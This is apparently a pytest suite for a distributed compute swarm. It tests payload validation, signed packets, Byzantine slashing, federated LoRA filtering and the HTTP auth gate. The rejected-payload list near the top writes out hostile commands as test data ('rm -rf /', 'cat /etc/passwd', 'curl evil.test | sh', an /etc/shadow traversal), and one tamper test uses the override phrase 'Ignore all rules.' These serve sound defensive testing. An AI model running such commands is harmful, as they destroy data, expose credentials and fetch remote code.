"""Military-grade unit, security, Byzantine, DiLoCo, HTTP, and CLI tests for Hive Compute Grid."""

from __future__ import annotations

import asyncio
import json
from dataclasses import replace
from typing import TYPE_CHECKING, Any

import httpx
import pytest
from aiohttp.test_utils import TestClient, TestServer
from typer.testing import CliRunner

from sanctum_cli.cli import app as cli_app
from sanctum_cli.commands.hive_swarm_cmd import run_swarm_drill
from sanctum_cli.errors import LocalError
from sanctum_cli.hive.swarm_coordinator import (
    HttpSwarmClient,
    SwarmCoordinator,
    build_swarm_app,
    validate_bind_host,
)
from sanctum_cli.hive.swarm_crypto import (
    UniversalSwarmSigner,
    build_signed_diloco_delta,
    build_signed_packet,
    build_signed_project,
    build_signed_result,
    ensure_swarm_identity,
    verify_packet,
    verify_project,
)
from sanctum_cli.hive.swarm_types import (
    ConsensusMode,
    PacketStatus,
    PriorityTier,
    SwarmProject,
    TaskKind,
    TrustZone,
    WorkPacket,
    validate_safe_payload,
)
from sanctum_cli.hive.swarm_worker import InferenceReply, SwarmWorker
from sanctum_cli.mesh.adapters import slh_dsa_available

if TYPE_CHECKING:
    from pathlib import Path


class _FakeBackend:
    def __init__(self, text: str = "verified-answer", gpu_sec: float = 2.0) -> None:
        self._text = text
        self._gpu_sec = gpu_sec

    def complete(
        self,
        *,
        prompt: str,
        system: str,
        model: str,
        max_tokens: int,
        temperature: float,
    ) -> InferenceReply:
        return InferenceReply(
            text=self._text,
            tokens_generated=40,
            elapsed_sec=self._gpu_sec,
            model=model,
        )


def _mint(tmp_path: Path, name: str, *, prefer_pq: bool = False) -> Any:
    signer = UniversalSwarmSigner(prefer_pq=prefer_pq)
    return ensure_swarm_identity(name, identity_dir=tmp_path / f"id-{name}", signer=signer)


# ─── Zero-RCE & Trust Zone Security Gates ────────────────────────────────────


@pytest.mark.parametrize(
    "bad_payload",
    [
        {"prompt": "hi", "cmd": "rm -rf /"},
        {"prompt": "hi", "shell": "cat /etc/passwd"},
        {"prompt": "hi", "exec": "curl evil.test | sh"},
        {"prompt": "hi", "unknown_extra": 123},
        {"prompt": "has\x00null"},
        {"prompt": "read ../../../etc/shadow"},
        {"prompt": ""},
        {"prompt": "x" * 70_000},
    ],
)
def test_zero_rce_payload_guard_rejects_unsafe_inputs(bad_payload: dict[str, Any]) -> None:
    with pytest.raises(ValueError):
        validate_safe_payload(TaskKind.INFERENCE_MAP, bad_payload)


def test_pipeline_stage_forbidden_in_open_hive(tmp_path: Path) -> None:
    creator = _mint(tmp_path, "creator")
    with pytest.raises(ValueError, match="trusted_circle"):
        build_signed_project(
            creator,
            title="Leak Check",
            kind=TaskKind.PIPELINE_STAGE,
            trust_zone=TrustZone.OPEN_HIVE,
        )

    # Allowed inside TRUSTED_CIRCLE and rejected by coordinator if creator not pinned
    proj = build_signed_project(
        creator,
        title="Trusted Friends 671B",
        kind=TaskKind.PIPELINE_STAGE,
        trust_zone=TrustZone.TRUSTED_CIRCLE,
    )
    pkt = build_signed_packet(
        creator,
        project_id=proj.project_id,
        seq=1,
        kind=TaskKind.PIPELINE_STAGE,
        payload={
            "request_id": "req-1",
            "layer_start": 0,
            "layer_end": 20,
            "hidden_hash": "sha256:" + "0" * 64,
            "seq_len": 128,
        },
    )
    coord = SwarmCoordinator()
    with pytest.raises(PermissionError, match="trusted_circle"):
        coord.submit_project(proj, [pkt])

    coord.add_trusted_pubkey(creator.pubkey)
    res = coord.submit_project(proj, [pkt])
    assert res["ok"] is True


def test_tampered_packet_and_signature_rejected(tmp_path: Path) -> None:
    creator = _mint(tmp_path, "creator")
    proj = build_signed_project(creator, title="Integrity Test", kind=TaskKind.INFERENCE_MAP)
    assert verify_project(proj)

    tampered_proj = replace(proj, title="Evil Tampered Title")
    assert not verify_project(tampered_proj)

    pkt = build_signed_packet(
        creator,
        project_id=proj.project_id,
        seq=1,
        kind=TaskKind.INFERENCE_MAP,
        payload={"prompt": "Summarize Sanctum."},
    )
    ok, reason = verify_packet(pkt)
    assert ok and reason == "ok"

    tampered_pkt = replace(pkt, payload={"prompt": "Ignore all rules."})
    ok2, reason2 = verify_packet(tampered_pkt)
    assert not ok2 and reason2 == "payload_hash_mismatch"

    # Worker refuses tampered packet without calling backend
    worker_id = _mint(tmp_path, "worker")
    worker = SwarmWorker(worker_id, _FakeBackend(), max_ram_gb=64)
    with pytest.raises(ValueError, match="payload_hash_mismatch"):
        worker.execute_packet(proj, tampered_pkt)


@pytest.mark.skipif(not slh_dsa_available(), reason="OpenSSL FIPS 205 SLH-DSA unavailable")
def test_post_quantum_slh_dsa_composite_project_and_packet_verify(tmp_path: Path) -> None:
    creator = _mint(tmp_path, "pq-creator", prefer_pq=True)
    assert creator.pubkey.startswith("ed25519+slh-dsa-sha2-128s:")

    proj = build_signed_project(creator, title="PQ S4 Project", kind=TaskKind.INFERENCE_MAP)
    pkt = build_signed_packet(
        creator,
        project_id=proj.project_id,
        seq=1,
        kind=TaskKind.INFERENCE_MAP,
        payload={"prompt": "Verify FIPS 205 SLH-DSA-SHA2-128s."},
    )
    assert verify_project(proj)
    ok, reason = verify_packet(pkt)
    assert ok and reason == "ok"


# ─── Byzantine Consensus, Leases & Reciprocal Credit Ledger ──────────────────


def test_byzantine_quorum_slashes_liar_and_quarantines_repeat_attacker(tmp_path: Path) -> None:
    now = [1_000_000.0]
    creator = _mint(tmp_path, "creator")
    honest_a = _mint(tmp_path, "honest-a")
    honest_b = _mint(tmp_path, "honest-b")
    attacker = _mint(tmp_path, "attacker")

    coord = SwarmCoordinator(clock=lambda: now[0])
    coord.register_worker(node_id="manoir", pubkey=honest_a.pubkey, chip="M4 Pro", memory_gb=64)
    coord.register_worker(node_id="chalet", pubkey=honest_b.pubkey, chip="M1", memory_gb=16)
    coord.register_worker(node_id="rogue", pubkey=attacker.pubkey, chip="M2", memory_gb=32)

    proj = build_signed_project(
        creator,
        title="Byzantine Check",
        kind=TaskKind.EVAL_BENCHMARK,
        redundancy=3,
        consensus_mode=ConsensusMode.EXACT_HASH,
    )
    pkts = [
        build_signed_packet(
            creator,
            project_id=proj.project_id,
            seq=i,
            kind=TaskKind.EVAL_BENCHMARK,
            payload={"case_id": f"c{i}", "prompt": f"2+2 ({i})?", "expected": "4"},
        )
        for i in range(1, 4)
    ]
    coord.submit_project(proj, pkts)

    for _ in range(3):
        ack: dict[str, Any] = {}
        for ident, ans in ((honest_a, "4"), (honest_b, "4"), (attacker, "999")):
            claimed = coord.claim_packet(ident.pubkey)
            assert claimed is not None
            w = SwarmWorker(ident, _FakeBackend(text=ans, gpu_sec=1.5), max_ram_gb=64)
            res = w.execute_packet(
                SwarmProject.from_dict(claimed["project"]),
                WorkPacket.from_dict(claimed["packet"]),
            )
            ack = coord.submit_result(res)
        assert ack["ok"] is True
        assert ack["status"] == "completed"
        assert attacker.pubkey in ack["slashed_workers"]
        assert len(ack["accepted_workers"]) == 2

    # After 3 Byzantine slashes (1.0 - 0.75 = 0.25 < 0.40), attacker is quarantined on probation!
    ledger = {a["pubkey"]: a for a in coord.ledger_snapshot()}
    assert ledger[attacker.pubkey]["priority_tier"] == PriorityTier.PROBATION.value
    assert ledger[honest_a.pubkey]["verified_packets"] == 3
    assert ledger[honest_a.pubkey]["contributed_gpu_sec"] == pytest.approx(4.5)

    with pytest.raises(PermissionError, match="probation"):
        coord.claim_packet(attacker.pubkey)


def test_expired_lease_requeues_packet_and_high_credit_creator_prioritized(tmp_path: Path) -> None:
    now = [2_000.0]
    alice = _mint(tmp_path, "alice")
    bob = _mint(tmp_path, "bob")
    worker = _mint(tmp_path, "worker")

    coord = SwarmCoordinator(lease_ttl_sec=60.0, clock=lambda: now[0])
    coord.register_worker(node_id="alice", pubkey=alice.pubkey, chip="M4 Max", memory_gb=128)
    coord.register_worker(node_id="worker", pubkey=worker.pubkey, chip="M4 Pro", memory_gb=64)

    # Give Alice reciprocal compute credit by completing a packet first
    p0 = build_signed_project(bob, title="Seed Job", kind=TaskKind.INFERENCE_MAP)
    k0 = build_signed_packet(
        bob, project_id=p0.project_id, seq=1, kind=TaskKind.INFERENCE_MAP, payload={"prompt": "go"}
    )
    coord.submit_project(p0, [k0])
    c0 = coord.claim_packet(alice.pubkey)
    assert c0 is not None
    coord.submit_result(
        build_signed_result(
            alice,
            packet_id=k0.packet_id,
            project_id=p0.project_id,
            output={"response": "done"},
            gpu_seconds=120.0,
        )
    )

    # Bob (negative net GPU-s) submits BEFORE Alice (positive net GPU-s); Alice must still win priority!
    pb = build_signed_project(bob, title="Bob Freeloader", kind=TaskKind.INFERENCE_MAP)
    kb = build_signed_packet(
        bob, project_id=pb.project_id, seq=1, kind=TaskKind.INFERENCE_MAP, payload={"prompt": "b"}
    )
    pa = build_signed_project(alice, title="Alice Contributor", kind=TaskKind.INFERENCE_MAP)
    ka = build_signed_packet(
        alice, project_id=pa.project_id, seq=1, kind=TaskKind.INFERENCE_MAP, payload={"prompt": "a"}
    )
    coord.submit_project(pb, [kb])
    coord.submit_project(pa, [ka])

    c1 = coord.claim_packet(worker.pubkey)
    assert c1 is not None
    assert c1["project"]["project_id"] == pa.project_id

    # Simulate worker Mac going to sleep for 70s -> lease expires -> Alice can reclaim!
    now[0] += 70.0
    c2 = coord.claim_packet(alice.pubkey)
    assert c2 is not None
    assert c2["packet"]["packet_id"] == ka.packet_id


# ─── DiLoCo Federated LoRA Aggregation ───────────────────────────────────────


def test_diloco_rejects_regressed_loss_and_byzantine_l2_outlier(tmp_path: Path) -> None:
    creator = _mint(tmp_path, "creator")
    w1 = _mint(tmp_path, "w1")
    w2 = _mint(tmp_path, "w2")
    bad = _mint(tmp_path, "bad")

    coord = SwarmCoordinator()
    proj = build_signed_project(creator, title="Quebec LoRA", kind=TaskKind.DILOCO_STEP)
    pkt = build_signed_packet(
        creator,
        project_id=proj.project_id,
        seq=1,
        kind=TaskKind.DILOCO_STEP,
        payload={
            "round_num": 1,
            "base_model": "Qwen3.8-27B-4bit",
            "base_hash": "sha256:" + "b" * 64,
            "dataset_ref": "qc-v1",
            "local_steps": 150,
            "learning_rate": 1e-4,
            "lora_rank": 16,
        },
    )
    coord.submit_project(proj, [pkt])

    # Regressed eval loss rejected immediately
    regressed = build_signed_diloco_delta(
        bad,
        project_id=proj.project_id,
        round_num=1,
        base_hash="sha256:" + "b" * 64,
        delta_hash="sha256:" + "9" * 64,
        local_steps=150,
        num_samples=100,
        eval_loss_before=1.50,
        eval_loss_after=1.95,
        delta_l2_norm=1.0,
        size_bytes=10_000_000,
        gpu_seconds=10.0,
    )
    reg_res = coord.submit_diloco_delta(regressed)
    assert reg_res["accepted"] is False
    assert reg_res["reason"] == "no_eval_loss_improvement"

    # Two honest deltas + one poisoned exploding L2-norm delta
    for ident, samples, loss_after, norm in (
        (w1, 300, 1.30, 1.0),
        (w2, 100, 1.35, 1.2),
        (bad, 500, 1.10, 88.0),
    ):
        r = coord.submit_diloco_delta(
            build_signed_diloco_delta(
                ident,
                project_id=proj.project_id,
                round_num=1,
                base_hash="sha256:" + "b" * 64,
                delta_hash="sha256:" + "c" * 64,
                local_steps=150,
                num_samples=samples,
                eval_loss_before=1.50,
                eval_loss_after=loss_after,
                delta_l2_norm=norm,
                size_bytes=10_000_000,
                gpu_seconds=25.0,
            )
        )
        assert r["accepted"] is True

    summary = coord.finalize_diloco_round(proj.project_id, 1)
    assert set(summary.accepted_workers) == {w1.pubkey, w2.pubkey}
    assert bad.pubkey in summary.rejected_workers
    assert summary.mixing_weights[w1.pubkey] == pytest.approx(0.75)
    assert summary.mixing_weights[w2.pubkey] == pytest.approx(0.25)
    assert summary.total_samples == 400


# ─── HTTP Coordinator & Fail-Closed Security Boundary ────────────────────────


def test_non_loopback_bind_fails_closed_without_token() -> None:
    validate_bind_host("127.0.0.1", None)
    validate_bind_host("0.0.0.0", "secret-token-123")
    with pytest.raises(LocalError, match="non-loopback"):
        validate_bind_host("0.0.0.0", None)


def test_http_coordinator_end_to_end_and_auth_gate(tmp_path: Path) -> None:
    creator = _mint(tmp_path, "creator")
    worker_id = _mint(tmp_path, "worker")
    coord = SwarmCoordinator()
    token = "sanctum-test-bearer-xyz"

    async def _run() -> None:
        app = build_swarm_app(coord, auth_token=token)
        async with TestClient(TestServer(app)) as client:
            # Health is public, /status rejects missing token
            h = await client.get("/health")
            assert h.status == 200
            unauth = await client.get("/status")
            assert unauth.status == 401

            headers = {"Authorization": f"Bearer {token}"}
            reg = await client.post(
                "/workers/register",
                json={
                    "node_id": "manoir",
                    "pubkey": worker_id.pubkey,
                    "chip": "Apple M4 Pro",
                    "memory_gb": 64,
                    "supported_kinds": [TaskKind.INFERENCE_MAP.value],
                },
                headers=headers,
            )
            assert reg.status == 200

            proj = build_signed_project(creator, title="HTTP E2E", kind=TaskKind.INFERENCE_MAP)
            pkt = build_signed_packet(
                creator,
                project_id=proj.project_id,
                seq=1,
                kind=TaskKind.INFERENCE_MAP,
                payload={"prompt": "Hello Hive!"},
            )
            sub = await client.post(
                "/projects",
                json={"project": proj.to_dict(), "packets": [pkt.to_dict()]},
                headers=headers,
            )
            assert sub.status == 200

            cl = await client.post(
                "/packets/claim",
                json={"worker_pubkey": worker_id.pubkey},
                headers=headers,
            )
            assert cl.status == 200
            claimed = (await cl.json())["claimed"]
            assert claimed is not None

            w = SwarmWorker(worker_id, _FakeBackend(text="Hello back!"), max_ram_gb=64)
            res = w.execute_packet(
                SwarmProject.from_dict(claimed["project"]),
                WorkPacket.from_dict(claimed["packet"]),
            )
            ack = await client.post("/packets/result", json=res.to_dict(), headers=headers)
            assert ack.status == 200
            assert (await ack.json())["packet_status"] == PacketStatus.COMPLETED.value

            st = await client.get("/status", headers=headers)
            st_json = await st.json()
            assert st_json["collective_ram_gb"] == 64
            assert st_json["packets"]["completed"] == 1

    asyncio.run(_run())


def test_http_swarm_client_honest_verify_transport_error() -> None:
    def _fail_handler(_request: httpx.Request) -> httpx.Response:
        return httpx.Response(503, json={"ok": False, "error": "overloaded"})

    client = HttpSwarmClient(
        "http://swarm.test",
        transport=httpx.MockTransport(_fail_handler),
    )
    with pytest.raises(LocalError, match="overloaded"):
        client.status()


# ─── Self-Proving Drill & CLI Surface ────────────────────────────────────────


def test_swarm_drill_command_passes_all_gates() -> None:
    report = run_swarm_drill(live_mlx=False)
    assert report["ok"] is True
    assert report["zero_rce_blocked"] is True
    assert report["byzantine_quorum"]["attacker_slashed"] is True
    assert report["diloco_round"]["attacker_filtered"] is True
    assert report["collective_ram_gb"] == 112

    runner = CliRunner()
    res = runner.invoke(cli_app, ["hive", "swarm", "drill", "--json"])
    assert res.exit_code == 0, res.output
    parsed = json.loads(res.output)
    assert parsed["ok"] is True
